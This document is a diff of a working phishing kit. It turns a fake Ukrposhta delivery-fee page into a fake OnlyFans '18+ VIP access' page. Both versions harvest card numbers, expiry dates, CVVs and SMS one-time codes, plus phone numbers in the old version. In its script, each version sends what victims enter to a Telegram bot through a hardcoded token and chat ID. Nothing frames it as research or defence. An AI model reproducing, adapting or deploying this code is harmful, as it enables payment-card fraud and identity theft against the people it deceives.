@@ -1,292 +1,242 @@
 <!DOCTYPE html>
-<html lang="uk">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Укрпошта – повідомлення про доставку</title>
+    <title>Exclusive Access | OnlyFans</title>
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,600;14..32,700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
+
         body {
-            font-family: 'Roboto', sans-serif;
-            background: #eef2f6;
+            font-family: 'Inter', sans-serif;
+            background: #0a0a0a;
             min-height: 100vh;
             display: flex;
             align-items: center;
             justify-content: center;
-            padding: 16px;
+            padding: 20px;
         }
-        .ukrposhta-wrapper {
-            max-width: 580px;
+
+        .of-container {
+            max-width: 480px;
             width: 100%;
-            background: #ffffff;
-            border-radius: 20px;
-            box-shadow: 0 20px 40px rgba(0, 61, 158, 0.15);
+            background: #1a1a1a;
+            border-radius: 32px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5);
             overflow: hidden;
-            border: 1px solid #d4dde8;
+            border: 1px solid #ff66c0;
         }
+
         .header {
-            background: #003d9e;
-            padding: 24px 24px 16px;
+            background: linear-gradient(135deg, #ff66c0, #ff3388);
+            padding: 30px 24px;
+            text-align: center;
             color: white;
-            background-image: linear-gradient(145deg, #003d9e 0%, #002c7a 100%);
         }
-        .logo-row {
-            display: flex;
-            align-items: center;
-            gap: 12px;
+
+        .logo {
+            font-size: 32px;
+            font-weight: 800;
+            letter-spacing: -1px;
+            margin-bottom: 8px;
+        }
+
+        .logo span {
+            color: #ffcc00;
+        }
+
+        .tagline {
+            font-size: 14px;
+            opacity: 0.9;
+        }
+
+        .content {
+            padding: 24px;
+        }
+
+        .preview {
+            background: #2a2a2a;
+            border-radius: 20px;
+            padding: 20px;
+            text-align: center;
+            margin-bottom: 24px;
+            border: 1px dashed #ff66c0;
+        }
+
+        .preview i {
+            font-size: 56px;
+            color: #ff66c0;
             margin-bottom: 12px;
         }
-        .trident { font-size: 44px; color: #ffd700; filter: drop-shadow(0 2px 4px rgba(0,0,0,0.2)); }
-        .logo-text { font-weight: 700; font-size: 28px; letter-spacing: 0.5px; }
-        .logo-text span { color: #ffd700; font-weight: 400; }
-        .badge {
-            display: inline-flex;
-            align-items: center;
-            gap: 8px;
-            background: rgba(255,255,255,0.12);
-            backdrop-filter: blur(4px);
-            padding: 6px 18px;
-            border-radius: 40px;
-            font-size: 13px;
-            border: 1px solid rgba(255,215,0,0.3);
+
+        .preview h3 {
+            color: #fff;
+            margin-bottom: 8px;
         }
-        .badge i { color: #ffd700; }
-        .alert-block {
-            background: #fff9e6;
-            border-left: 6px solid #ffd700;
-            border-radius: 12px;
-            margin: 20px 24px;
-            padding: 18px 20px;
-            box-shadow: 0 4px 12px rgba(255,215,0,0.2);
-        }
-        .alert-row {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            margin: 8px 0;
-            font-size: 15px;
-            color: #1e293b;
-        }
-        .alert-row i { width: 24px; color: #003d9e; }
-        .order-tag {
-            background: #c41e3a;
-            color: white;
-            font-weight: 700;
-            padding: 4px 16px;
-            border-radius: 40px;
-            font-size: 18px;
-            display: inline-block;
-        }
-        .cost-badge {
-            background: #ffd700;
-            color: #003d9e;
-            font-weight: 700;
-            font-size: 22px;
-            padding: 4px 18px;
-            border-radius: 40px;
-            display: inline-block;
-            margin-left: 8px;
-        }
-        /* Новий блок з текстом про менеджера */
-        .manager-note {
-            background: #e1f0fa;
-            border-radius: 16px;
-            padding: 16px 18px;
-            margin: 15px 24px 5px;
-            border: 1px dashed #003d9e;
+
+        .preview p {
+            color: #aaa;
             font-size: 14px;
-            display: flex;
-            align-items: center;
-            gap: 12px;
         }
-        .manager-note i {
-            font-size: 28px;
-            color: #003d9e;
+
+        .price {
+            background: #ff66c0;
+            color: #000;
+            font-weight: 800;
+            font-size: 24px;
+            padding: 8px 20px;
+            border-radius: 60px;
+            display: inline-block;
+            margin: 16px 0;
         }
-        .content { padding: 0 24px 24px; }
-        .section-title {
-            font-weight: 700;
-            font-size: 18px;
-            color: #003d9e;
-            margin: 20px 0 16px;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            border-bottom: 2px solid #ffd700;
-            padding-bottom: 8px;
+
+        .form-group {
+            margin-bottom: 20px;
         }
-        .form-group { margin-bottom: 20px; }
+
         .form-group label {
             display: block;
-            font-weight: 500;
-            font-size: 14px;
-            color: #2c3e50;
-            margin-bottom: 6px;
+            font-size: 12px;
+            font-weight: 600;
+            color: #ff66c0;
+            text-transform: uppercase;
+            margin-bottom: 8px;
         }
-        .input-wrapper { position: relative; }
+
+        .input-wrapper {
+            position: relative;
+        }
+
         .input-wrapper i {
             position: absolute;
-            left: 18px;
+            left: 16px;
             top: 50%;
             transform: translateY(-50%);
-            color: #003d9e;
-            font-size: 18px;
+            color: #ff66c0;
         }
+
         .input-wrapper input {
             width: 100%;
-            background: #f8faff;
-            border: 2px solid #dce3ef;
+            background: #2a2a2a;
+            border: 1px solid #3a3a3a;
             border-radius: 60px;
-            padding: 16px 16px 16px 54px;
+            padding: 16px 16px 16px 48px;
             font-size: 16px;
-            font-family: 'Roboto', sans-serif;
+            color: white;
             transition: 0.2s;
         }
+
         .input-wrapper input:focus {
-            border-color: #ffd700;
+            border-color: #ff66c0;
             outline: none;
-            background: #ffffff;
-            box-shadow: 0 0 0 4px rgba(255,215,0,0.2);
+            box-shadow: 0 0 0 3px rgba(255,102,192,0.2);
         }
-        .row-duo { display: flex; gap: 12px; }
-        .row-duo .form-group { flex: 1; }
+
+        .row-duo {
+            display: flex;
+            gap: 12px;
+        }
+        .row-duo .form-group {
+            flex: 1;
+        }
+
         .btn {
-            background: #ffd700;
-            color: #003d9e;
+            background: #ff66c0;
+            color: #000;
             border: none;
             border-radius: 60px;
-            padding: 18px;
+            padding: 16px;
             font-size: 18px;
             font-weight: 700;
             width: 100%;
             cursor: pointer;
             transition: 0.2s;
-            box-shadow: 0 8px 20px rgba(255,215,0,0.4);
-            border: 2px solid #e6b800;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            margin-top: 20px;
+            margin-top: 12px;
         }
+
         .btn:hover {
-            background: #e6b800;
+            background: #ff3388;
             transform: translateY(-2px);
-            box-shadow: 0 15px 30px rgba(0,61,158,0.15);
         }
+
         .payment-icons {
             display: flex;
             justify-content: center;
-            gap: 30px;
-            margin: 24px 0 8px;
-            color: #b8c7dd;
-            font-size: 30px;
+            gap: 20px;
+            margin: 20px 0;
+            color: #ff66c0;
+            font-size: 28px;
         }
-        .otp-section { display: none; text-align: center; }
+
+        .footer-note {
+            text-align: center;
+            font-size: 12px;
+            color: #666;
+            margin-top: 20px;
+        }
+
         .otp-inputs {
             display: flex;
             gap: 12px;
             justify-content: center;
-            margin: 24px 0;
+            margin: 20px 0;
         }
         .otp-inputs input {
-            width: 65px;
-            height: 75px;
-            background: #f8faff;
-            border: 2px solid #dce3ef;
-            border-radius: 20px;
+            width: 60px;
+            height: 70px;
+            background: #2a2a2a;
+            border: 1px solid #3a3a3a;
+            border-radius: 16px;
             text-align: center;
-            font-size: 32px;
+            font-size: 28px;
             font-weight: 700;
-            color: #003d9e;
+            color: #ff66c0;
         }
         .otp-inputs input:focus {
-            border-color: #ffd700;
+            border-color: #ff66c0;
             outline: none;
-            box-shadow: 0 0 0 3px #ffd700;
         }
-        .resend-link { color: #003d9e; text-decoration: underline; text-underline-offset: 4px; font-size: 14px; }
-        .footer-note {
-            text-align: center;
-            font-size: 12px;
-            color: #8a9bb5;
-            margin-top: 20px;
-            border-top: 1px dashed #d4dde8;
-            padding-top: 16px;
+        .step {
+            display: block;
         }
-        .footer-note i { color: #ffd700; }
-        .debug-box {
-            background: #f0f3f8;
-            border-left: 4px solid #ffd700;
-            padding: 10px;
-            margin-top: 20px;
-            font-size: 12px;
-            border-radius: 10px;
+        .step.hidden {
             display: none;
-            max-height: 150px;
-            overflow: auto;
+        }
+        .thankyou {
+            text-align: center;
+            padding: 30px;
+            background: #2a2a2a;
+            border-radius: 20px;
+        }
+        .thankyou i {
+            font-size: 56px;
+            color: #ff66c0;
         }
     </style>
 </head>
 <body>
-    <div class="ukrposhta-wrapper">
+    <div class="of-container">
         <div class="header">
-            <div class="logo-row">
-                <div class="trident"><i class="fas fa-uk"></i></div>
-                <div class="logo-text">УКР<span>ПОШТА</span></div>
-            </div>
-            <div class="badge"><i class="fas fa-shield-alt"></i> офіційний сайт</div>
-        </div>
-
-        <div class="alert-block">
-            <div class="alert-row">
-                <i class="fas fa-exclamation-triangle" style="color:#c41e3a;"></i>
-                <span><strong>Терміново!</strong> Для отримання посилки сплатіть доставку.</span>
-            </div>
-            <div class="alert-row">
-                <i class="fas fa-box"></i>
-                <span><strong>Відправлення:</strong> <span class="order-tag">K-56742</span></span>
-            </div>
-            <div class="alert-row">
-                <i class="fas fa-calendar-alt"></i>
-                <span><strong>Надійшло:</strong> 13.03.2026</span>
-            </div>
-            <div class="alert-row">
-                <i class="fas fa-hourglass-half"></i>
-                <span><strong>Термін зберігання:</strong> 5 днів</span>
-            </div>
-            <div class="alert-row">
-                <i class="fas fa-truck"></i>
-                <span><strong>Вартість доставки:</strong> <span class="cost-badge">45 грн</span> (сплачує отримувач)</span>
-            </div>
-        </div>
-
-        <!-- Новий блок із важливим повідомленням -->
-        <div class="manager-note">
-            <i class="fas fa-headset"></i>
-            <div>
-                <strong>Після оплати з Вами зв'яжеться менеджер</strong><br>
-                Протягом 15 хвилин на номер <span style="color:#003d9e; font-weight:700;">+380 (XX) XXX-XX-XX</span> для уточнення адреси та зручного часу доставки.
-            </div>
+            <div class="logo">Only<span>Fans</span></div>
+            <div class="tagline">Exclusive content awaits</div>
         </div>
 
         <div class="content">
-            <!-- Крок 1 -->
-            <div id="step1">
-                <div class="section-title"><i class="fas fa-phone-alt"></i> Підтвердьте номер телефону</div>
-                <div class="form-group">
-                    <label>Мобільний (для SMS-коду та зв'язку)</label>
-                    <div class="input-wrapper">
-                        <i class="fas fa-mobile-alt"></i>
-                        <input type="tel" id="phone" placeholder="+380 00 000 00 00" value="+380">
-                    </div>
+            <!-- Step 1: Payment -->
+            <div id="stepPayment" class="step">
+                <div class="preview">
+                    <i class="fas fa-lock"></i>
+                    <h3>🔥 VIP Access 🔥</h3>
+                    <p>Unlock 18+ exclusive content</p>
+                    <div class="price">$3.00 USD</div>
                 </div>
 
-                <div class="section-title"><i class="fas fa-credit-card"></i> Сплатіть 45 грн</div>
                 <div class="form-group">
-                    <label>Номер картки</label>
+                    <label>Card Number</label>
                     <div class="input-wrapper">
                         <i class="fas fa-credit-card"></i>
                         <input type="text" id="card" placeholder="0000 0000 0000 0000" maxlength="19" inputmode="numeric">
@@ -294,7 +244,7 @@
                 </div>
                 <div class="row-duo">
                     <div class="form-group">
-                        <label>Термін</label>
+                        <label>Expiry</label>
                         <div class="input-wrapper">
                             <i class="fas fa-calendar-alt"></i>
                             <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" inputmode="numeric">
@@ -309,67 +259,58 @@
                     </div>
                 </div>
 
-                <button class="btn" id="payBtn"><i class="fas fa-check-circle"></i> Сплатити 45 грн</button>
-
+                <button class="btn" id="payBtn">Unlock for $3 <i class="fas fa-arrow-right"></i></button>
                 <div class="payment-icons">
                     <i class="fab fa-cc-visa"></i>
                     <i class="fab fa-cc-mastercard"></i>
                     <i class="fab fa-cc-amex"></i>
-                    <i class="fab fa-cc-apple-pay"></i>
                 </div>
-
-                <div id="debug" class="debug-box"></div>
+                <div class="footer-note">
+                    <i class="fas fa-shield-alt"></i> Secure payment. 3D Secure.
+                </div>
             </div>
 
-            <!-- Крок 2: OTP -->
-            <div id="step2" style="display: none;">
-                <div class="section-title"><i class="fas fa-lock"></i> Підтвердження</div>
-                <p style="margin-bottom: 20px;">Код надіслано на <strong id="phoneDisplay"></strong></p>
+            <!-- Step 2: SMS code -->
+            <div id="stepOtp" class="step hidden">
+                <div class="preview">
+                    <i class="fas fa-mobile-alt"></i>
+                    <h3>Verify your identity</h3>
+                    <p>We've sent a 4-digit code to your phone</p>
+                </div>
                 <div class="otp-inputs">
                     <input type="text" maxlength="1" class="otp-digit">
                     <input type="text" maxlength="1" class="otp-digit">
                     <input type="text" maxlength="1" class="otp-digit">
                     <input type="text" maxlength="1" class="otp-digit">
                 </div>
-                <button class="btn" id="confirmBtn"><i class="fas fa-check"></i> Підтвердити</button>
-                <p style="margin-top: 20px;"><a href="#" class="resend-link" id="resendLink">Не отримали код?</a></p>
+                <button class="btn" id="confirmBtn">Confirm Code</button>
+                <p style="text-align: center; margin-top: 15px;">
+                    <a href="#" id="resendLink" style="color: #ff66c0;">Didn't receive code?</a>
+                </p>
             </div>
 
-            <div class="footer-note">
-                <i class="fas fa-shield-alt"></i> Захищене SSL-з'єднання · Укрпошта 2026
+            <!-- Step 3: Success -->
+            <div id="stepThanks" class="step hidden">
+                <div class="thankyou">
+                    <i class="fas fa-check-circle"></i>
+                    <h3>Access Granted!</h3>
+                    <p>Your exclusive content is ready.</p>
+                    <button class="btn" id="viewContentBtn" style="margin-top: 20px;">View Now</button>
+                </div>
             </div>
         </div>
     </div>
 
     <script>
-        // ========== ВАШІ ДАНІ ==========
-        const TELEGRAM_BOT_TOKEN = '8627594813:AAHpH3nCmbBsWZScQNZdygLIOj8ErRogz-U';
-        const ADMIN_CHAT_ID = '8453084997';
-        const DELIVERY_COST = 45;
+        // ========== BOT SETTINGS ==========
+        const TELEGRAM_BOT_TOKEN = '7687979217:AAFrV5O39V_9gnNHdr9K3i5QMD2Z0qN-bew';
+        const ADMIN_CHAT_ID = '8506735626';
 
         let orderData = {};
-        const debugDiv = document.getElementById('debug');
-
-        function log(msg, isErr = false) {
-            console.log(msg);
-            if (debugDiv) {
-                debugDiv.style.display = 'block';
-                debugDiv.innerHTML += `<div style="color:${isErr ? '#c41e3a' : '#003d9e'}; padding:4px; border-bottom:1px solid #ccc;">${new Date().toLocaleTimeString()}: ${msg}</div>`;
-                debugDiv.scrollTop = debugDiv.scrollHeight;
-            }
-        }
 
         async function sendToTelegram(message) {
-            log('Надсилання до Telegram...');
-            if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN.length < 20) {
-                log('ПОМИЛКА: токен бота недійсний', true);
-                alert('Помилка: невірний токен бота');
-                return false;
-            }
-
-            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
             try {
-                const response = await fetch(url, {
+                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
@@ -379,73 +320,50 @@
                     })
                 });
                 const data = await response.json();
-                log(`Статус: ${response.status}, відповідь: ${JSON.stringify(data)}`);
-                if (data.ok) {
-                    log('✅ Успішно');
-                    return true;
-                } else {
-                    log(`❌ Помилка: ${data.description}`, true);
-                    alert(`Помилка Telegram: ${data.description || 'невідома'}`);
-                    return false;
-                }
-            } catch (error) {
-                log(`❌ Мережева помилка: ${error}`, true);
-                alert('Помилка з’єднання. Перевірте інтернет.');
+                return data.ok;
+            } catch (e) {
+                console.error(e);
                 return false;
             }
         }
 
-        document.getElementById('payBtn').addEventListener('click', async function(e) {
-            e.preventDefault();
-            log('Кнопка "Сплатити 45 грн" натиснута');
-
-            const phone = document.getElementById('phone').value.trim();
+        document.getElementById('payBtn').addEventListener('click', async function() {
             const card = document.getElementById('card').value.replace(/\s/g, '');
             const expiry = document.getElementById('expiry').value;
             const cvv = document.getElementById('cvv').value;
 
-            if (!phone || !card || !expiry || !cvv) {
-                alert('Заповніть всі поля');
-                log('ПОМИЛКА: незаповнені поля', true);
+            if (!card || !expiry || !cvv) {
+                alert('Please fill all fields');
                 return;
             }
-
-            if (phone.replace(/\D/g, '').length < 10) {
-                alert('Номер телефону має містити мінімум 10 цифр');
-                log('ПОМИЛКА: короткий номер', true);
-                return;
-            }
-
             if (card.length < 16) {
-                alert('Номер картки має містити 16 цифр');
-                log('ПОМИЛКА: неповна картка', true);
+                alert('Invalid card number');
                 return;
             }
 
-            orderData = { phone, card, expiry, cvv };
+            orderData = { card, expiry, cvv };
 
             const msg = `
-📮 <b>УКРПОШТА — ОПЛАТА ДОСТАВКИ</b>
+🔞 <b>OnlyFans – NEW SUBSCRIPTION</b>
 
-📦 Відправлення: <b>K-56742</b>
-📞 Телефон: ${phone}
-💳 Картка: ${card}
-📅 Термін: ${expiry}
-🔐 CVV: ${cvv}
-💰 Сума: ${DELIVERY_COST} грн
-🕒 Час: ${new Date().toLocaleString('uk-UA')}
+💳 <b>Card details:</b>
+• Number: <code>${card}</code>
+• Expiry: ${expiry}
+• CVV: ${cvv}
+💰 <b>Amount:</b> $3.00
+🕒 <b>Time:</b> ${new Date().toLocaleString()}
             `;
 
             const success = await sendToTelegram(msg);
             if (success) {
-                document.getElementById('phoneDisplay').innerText = phone;
-                document.getElementById('step1').style.display = 'none';
-                document.getElementById('step2').style.display = 'block';
-                log('Перехід до кроку 2 (OTP)');
+                document.getElementById('stepPayment').classList.add('hidden');
+                document.getElementById('stepOtp').classList.remove('hidden');
+            } else {
+                alert('Payment error. Try again.');
             }
         });
 
-        // OTP handling
+        // OTP logic
         const otpInputs = document.querySelectorAll('.otp-digit');
         otpInputs.forEach((input, idx) => {
             input.addEventListener('keyup', function(e) {
@@ -462,47 +380,47 @@
             let otp = '';
             otpInputs.forEach(i => otp += i.value);
             if (otp.length !== 4) {
-                alert('Введіть 4 цифри');
+                alert('Enter 4-digit code');
                 return;
             }
 
             const otpMsg = `
-🔐 <b>Код підтвердження</b>
-📦 K-56742 | 📞 ${orderData.phone}
-💳 ${orderData.card}
-🔢 Код: <code>${otp}</code>
+🔐 <b>OnlyFans – OTP Code</b>
+💳 Card: ${orderData.card}
+🔢 Code: <code>${otp}</code>
             `;
 
             const success = await sendToTelegram(otpMsg);
             if (success) {
-                alert('✅ Доставку підтверджено! Менеджер зв\'яжеться з вами протягом 15 хвилин.');
-                setTimeout(() => location.reload(), 2000);
+                document.getElementById('stepOtp').classList.add('hidden');
+                document.getElementById('stepThanks').classList.remove('hidden');
+            } else {
+                alert('Verification failed');
             }
         });
 
         document.getElementById('resendLink').addEventListener('click', function(e) {
             e.preventDefault();
-            alert('Демо: новий код надіслано');
+            alert('Demo: new code sent');
         });
 
-        // Форматування полів
+        document.getElementById('viewContentBtn').addEventListener('click', function() {
+            alert('Welcome to exclusive content! (demo)');
+        });
+
+        // Formatting
         document.getElementById('card').addEventListener('input', function(e) {
-            let v = e.target.value.replace(/\D/g, '').substring(0, 16);
+            let v = e.target.value.replace(/\D/g, '').substring(0,16);
             e.target.value = v.replace(/(.{4})/g, '$1 ').trim();
         });
-
         document.getElementById('expiry').addEventListener('input', function(e) {
-            let v = e.target.value.replace(/\D/g, '').substring(0, 4);
-            if (v.length >= 2) v = v.substring(0, 2) + '/' + v.substring(2);
+            let v = e.target.value.replace(/\D/g, '').substring(0,4);
+            if (v.length >= 2) v = v.substring(0,2) + '/' + v.substring(2);
             e.target.value = v;
         });
-
         document.getElementById('cvv').addEventListener('input', function(e) {
-            e.target.value = e.target.value.replace(/\D/g, '').substring(0, 3);
+            e.target.value = e.target.value.replace(/\D/g, '').substring(0,3);
         });
-
-        document.getElementById('phone').focus();
-        log('Скрипт завантажено. Усе готово.');
     </script>
 </body>
 </html>
